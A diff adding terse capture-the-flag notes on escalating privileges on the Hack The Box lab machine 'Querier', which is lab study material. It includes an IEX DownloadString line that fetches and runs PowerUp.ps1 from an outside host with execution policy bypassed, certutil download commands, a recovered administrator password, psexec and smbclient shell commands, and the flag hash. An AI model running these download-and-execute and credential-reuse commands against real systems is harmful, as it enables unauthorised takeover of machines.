@@ -1,0 +1,65 @@
+#10.10.10.125
+--------------
+#inside shell
+#whoami /priv
+#found SeImpersonatePrivilege enabled
+#but it is patched , check 'Hotfix(s)' value in 'systeminfo' cmd 
+
+#now upload priv esc script on machine
+#download powerup.ps1
+>>>https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc
+
+---------------------------------
+#USE MOBILE NETWORK FOR BETTER USE
+---------------------------------
+#upload powerup.ps1 on server  
+cd c:\users\mssql-svc\Documents
+#start local server (apache2)
+powershell Invoke-WebRequest -OutFile C:\users\mssql-svc\Documents\PowerUp.ps1 http://10.10.15.79/powerup.ps1
+		OR
+certutil -urlcache -split -f http://10.10.15.79/powerup.ps1 PowerUp.ps1    (didn't work)
+
+
+#execute powerup.ps1		(used)
+>>>https://www.harmj0y.net/blog/powershell/powerup-a-usage-guide/
+powershell -nop -exec bypass
+powershell Import-Module c:\users\mssql-svc\documents\PowerUp.ps1 
+powershell Invoke-AllChecks  (giving error)
+		OR
+#direct run from local server
+powershell -nop -exec bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.10.15.79/powerup.ps1'); Invoke-AllChecks"
+
+
+powershell -exec bypass -Command “{Import-Module c:\users\mssql-svc\documents\PowerUp.ps1; Invoke-AllChecks}”          (not wworking)
+
+#check output inside 'output(PowerUp_ps1).jpg' file
+#found credentials for administrator
+#USER= administrator
+#PASSWD= MyUnclesAreMarioAndLuigi!!1!
+
+-----------------------------------------
+#1st METHOD TO GET ADMIN SHELL    (used)
+-----------------------------------------
+#download 'psexec.py' script from 'impacket'
+>>>https://www.secureauth.com/labs/open-source-tools/impacket 
+python psexec.py administrator@10.10.10.125 cmd.exe -path c:\\windows\\system32
+#PASSWD= MyUnclesAreMarioAndLuigi!!1!
+#wait for some time
+#Got Shell
+
+
+-----------------------------------------
+2nd METHOD TO GET ADMIN SHELL     (used)
+-----------------------------------------
+#use smbclient
+smbclient \\\\10.10.10.125\\C$ -W QUERIER -U 'administrator%MyUnclesAreMarioAndLuigi!!1!'
+		OR
+smbclient \\\\10.10.10.125\\C$ -U administrator       [here C$=(default share)]
+#PASSWD= MyUnclesAreMarioAndLuigi!!1!
+
+#Got Shell
+
+
+#key
+b19c3794f786a1fdcf205f81497c3592
+
